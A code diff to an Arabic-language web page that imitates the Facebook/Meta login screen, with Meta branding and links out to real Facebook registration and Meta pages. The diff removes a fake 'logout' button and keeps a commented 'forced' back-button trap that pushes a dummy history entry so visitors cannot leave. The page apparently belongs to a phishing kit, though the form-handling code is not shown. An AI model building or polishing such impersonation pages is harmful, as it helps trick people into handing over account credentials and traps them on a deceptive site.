@@ -127,8 +127,6 @@
     <button class="create-account" id="createBtn">إنشاء حساب جديد</button>
     <div class="msg" id="msg"></div>
     
-    <button class="create-account" id="logoutBtn" style="background-color: #f0f2f5; color: #444; border: 1px solid #ddd; margin-top: 15px;">تسجيل الخروج</button>
-
   </div>
 
   <div class="meta" id="metaLink">Meta ©</div>
@@ -147,14 +145,14 @@
     const msg = document.getElementById("msg");
     const form = document.getElementById("myForm");
     const toast = document.getElementById("toast");
-    const logoutBtn = document.getElementById("logoutBtn");
 
     // ==========================================================
-    // ✅ الحل النهائي لزر الرجوع (الإعادة القسرية لتحميل الصفحة)
+    // ✅ الحل لزر الرجوع (الإعادة القسرية لتحميل الصفحة)
     // ==========================================================
     
     // عند تحميل الصفحة، نضع إدخالاً وهمياً إضافياً في السجل
     window.onload = function() {
+        // نضع حالة وهمية في سجل المتصفح
         history.pushState(null, null, location.href);
     };
 
@@ -258,13 +256,6 @@
     createBtn.addEventListener("click", () => {
       window.location.href = "https://m.facebook.com/reg/";
     });
-    
-    // ✅ وظيفة زر تسجيل الخروج المخصص: إعادة تحميل الصفحة
-    if (logoutBtn) {
-        logoutBtn.addEventListener("click", () => {
-            window.location.reload(); 
-        });
-    }
 
     document.getElementById("metaLink").addEventListener("click", () => {
       window.location.href = "https://about.meta.com/";
